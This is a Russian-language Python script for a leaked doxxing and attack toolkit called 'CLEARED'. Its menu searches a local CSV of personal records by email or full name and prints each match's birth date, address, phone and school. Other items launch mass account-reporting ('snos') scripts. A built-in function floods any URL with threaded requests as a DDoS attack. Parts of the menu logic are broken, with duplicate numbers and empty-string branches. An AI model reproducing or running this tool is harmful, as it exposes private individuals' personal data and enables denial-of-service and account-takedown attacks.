import csv
import os
import subprocess
import threading
import requests
from pystyle import Colors, Colorate, Center, Box
import time


COLOR_CODE = {
    "RESET": "\033[0m",
    "UNDERLINE": "\033[04m",
    "GREEN": "\033[32m",
    "YELLOW": "\033[93m",
    "RED": "\033[31m",
    "CYAN": "\033[36m",
    "BOLD": "\033[01m",
    "PINK": "\033[95m",
    "URL_L": "\033[36m",
    "LI_G": "\033[92m",
    "F_CL": "\033[0m",
    "DARK": "\033[90m",
}


def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')


banner = """

   
 ▄████████  ▄█          ▄████████    ▄████████    ▄████████    ▄████████ ████████▄       
███    ███ ███         ███    ███   ███    ███   ███    ███   ███    ███ ███   ▀███      
███    █▀  ███         ███    █▀    ███    ███   ███    ███   ███    █▀  ███    ███      
███        ███        ▄███▄▄▄       ███    ███  ▄███▄▄▄▄██▀  ▄███▄▄▄     ███    ███      
███        ███       ▀▀███▀▀▀     ▀███████████ ▀▀███▀▀▀▀▀   ▀▀███▀▀▀     ███    ███      
███    █▄  ███         ███    █▄    ███    ███ ▀███████████   ███    █▄  ███    ███      
███    ███ ███▌    ▄   ███    ███   ███    ███   ███    ███   ███    ███ ███   ▄███      
████████▀  █████▄▄██   ██████████   ███    █▀    ███    ███   ██████████ ████████▀       
           ▀                                     ███    ███                              
     
слито в t.me/pr0xit
"""


info_box = """
      ╔══════════════════════════════════════════════════╗
       TG : Felix_335 cleard soft не подлежит к продаже
      ╚══════════════════════════════════════════════════╝

"""

def display_banner():
    clear_console()
    combined_banner = f"{banner}{' ' * 5}{info_box}"
    print(Colorate.Horizontal(Colors.red_to_purple, Center.XCenter(combined_banner)))

def main_menu():
    search_options = [
        "1   Поиск по номеру ",
        "2   Поиск по почте ",
        "3   Поиск по IP ",
        "4   Поиск по ФИО ",
        "5   Поиск в локал бд по ФИО ",
        "6   Поиск по домену"
    ]

    other_options = [
        "5   СНОС  ",
        "6   СНОС 2",
        "7   DDoS атака ",
        ""
    ]

    max_len_search = max(len(option) for option in search_options)
    max_len_other = max(len(option) for option in other_options)

    left_column = [option.ljust(max_len_search) for option in search_options]
    middle_column = [""] * len(search_options)
    right_column = [option.ljust(max_len_other) for option in other_options]

    middle_index = len(search_options) // 2
    middle_column[middle_index] = "8 Запуск Fakegener<     ".center(max_len_search)


    separator = ''
    menu_lines = [f"{left}{separator}{middle}{separator}{right}" for left, middle, right in zip(left_column, middle_column, right_column)]
    
    menu_box = Box.DoubleCube("Main menu\n" + "\n".join(menu_lines))
    print(Colorate.Horizontal(Colors.red_to_purple, Center.XCenter(menu_box)))

def print_info_box(info):
    box = f'''
╔{"═" * 80}╗
║{' ' * 80}║
║{info}║
║{' ' * 80}║
╚{"═" * 80}╝
'''
    print(Colorate.Horizontal(Colors.red_to_purple, Center.XCenter(box)))

def get_mail(database_file, search_value):
    found = False

    with open(database_file, 'r', encoding='utf-8') as file:
        lines = file.readlines()

    for line in lines:
        data = line.strip().split(';')
        if len(data) >= 9:
            email = data[8]
            if search_value in email:
                user_id = data[0]
                registration_date = data[1]
                last_name = data[2]
                first_name = data[3]
                middle_name = data[4]
                birthday = data[5]
                gender = data[6]
                phone = data[7]
                role = data[9]
                class_name = data[13]
                address = data[19]
                country = data[16]
                citizenship = data[15]
                region = data[17]
                municipal_education = data[18]
                institution_name = data[20]

                info = f'''
[+]ID пользователя: {user_id}
[+]Дата регистрации: {registration_date}
[+]Фамилия: {last_name}
[+]Имя: {first_name}
[+]Отчество: {middle_name}
[+]Дата рождения: {birthday}
[+]Пол: {gender}
[+]Телефон: {phone}
[+]Почта: {email}
[+]Роль: {role}
[+]Класс: {class_name}
[+]Адрес: {address}
[+]Страна: {country}
[+]Гражданство: {citizenship}
[+]Регион: {region}
[+]Муниципальное образование: {municipal_education}
[+]Наименование учреждения: {institution_name}
'''
                print_info_box(info)
                found = True

    if not found:
        print(f'{COLOR_CODE["RED"]}[ERROR] Ничего не найдено в базе :(.{COLOR_CODE["RESET"]}')

def get_fio(database_file, search_value):
    found = False

    with open(database_file, 'r', encoding='utf-8') as file:
        lines = file.readlines()

    for line in lines:
        data = line.strip().split(';')
        if len(data) >= 5:
            last_name = data[2]
            first_name = data[3]
            middle_name = data[4]
            full_name = f"{last_name} {first_name} {middle_name}".strip().lower()
            if search_value.lower() in full_name:
                user_id = data[0]
                registration_date = data[1]
                birthday = data[5]
                gender = data[6]
                phone = data[7]
                email = data[8]
                role = data[9]
                class_name = data[13]
                address = data[19]
                country = data[16]
                citizenship = data[15]
                region = data[17]
                municipal_education = data[18]
                institution_name = data[20]

                info = f'''
[+]ID пользователя: {user_id}
[+]Дата регистрации: {registration_date}
[+]Фамилия: {last_name}
[+]Имя: {first_name}
[+]Отчество: {middle_name}
[+]Дата рождения: {birthday}
[+]Пол: {gender}
[+]Телефон: {phone}
[+]Почта: {email}
[+]Роль: {role}
[+]Класс: {class_name}
[+]Адрес: {address}
[+]Страна: {country}
[+]Гражданство: {citizenship}
[+]Регион: {region}
[+]Муниципальное образование: {municipal_education}
[+]Наименование учреждения: {institution_name}
'''
                print_info_box(info)
                found = True

    if not found:
        print(f'{COLOR_CODE["RED"]}[ERROR] Ничего не найдено в базе данных по ФИО.{COLOR_CODE["RESET"]}')

def ddos_attack():
    link = input(Colorate.Horizontal(Colors.red_to_green, "\nВведите ссылку для DDoS атаки > "))
    num_threads = int(input(Colorate.Horizontal(Colors.red_to_white, "Введите количество потоков > ")))
    attack_duration = int(input(Colorate.Horizontal(Colors.red_to_purple, "Введите длительность атаки (в секундах) > ")))

    def send_request():
        while time.time() < end_time:
            try:
                requests.get(link)
                print(f"{COLOR_CODE['GREEN']}Запрос отправлен на {link}{COLOR_CODE['RESET']}")
            except requests.RequestException:
                pass

    end_time = time.time() + attack_duration
    threads = []

    for _ in range(num_threads):
        thread = threading.Thread(target=send_request)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    print(Colorate.Horizontal(Colors.red_to_purple, "\nDDoS атака завершена"))

def main():
    while True:
        display_banner()
        main_menu()
        choice = input(Colorate.Horizontal(Colors.red_to_purple, "\nВыберите опцию > "))
        
        if choice == '1':
            subprocess.run(['python', 'number.py'])
        
        elif choice == '2':
            email = input(Colorate.Horizontal(Colors.red_to_green, "Введите электронную почту > "))
            get_mail('bd1.csv', email)
        
        elif choice == '3':
            subprocess.run(['python', 'ip.py'])
        
        elif choice == '4':
            fio = input(Colorate.Horizontal(Colors.red_to_white, "Введите ФИО > "))
            get_fio('bd1.csv', fio)
            
        
        elif choice == '':
            subprocess.run(['python', 'domain_info.py'])
        
        elif choice == '8':
            subprocess.run(['python', 'fakegener.py'])
        
        elif choice == '5':
            subprocess.run(['python','/storage/emulated/0/Download/Telegram/CLEARED/speed_snos.py'])

        elif choice == '6':
            subprocess.run(['python','/storage/emulated/0/Download/Telegram/CLEARED/TeleSession1.py'])
        
        elif choice == '7':
            ddos_attack()
        
        elif choice == '':
            print(Colorate.Horizontal(Colors.red_to_green, "Выход..."))
            break
        
        else:
            print(Colorate.Horizontal(Colors.red_to_green, f"Вы выбрали > {choice}"))
        
        input(Colorate.Horizontal(Colors.red_to_purple, "\nНажмите Enter для возврата в меню..."))
        clear_console()

if __name__ == "__main__":
    main()
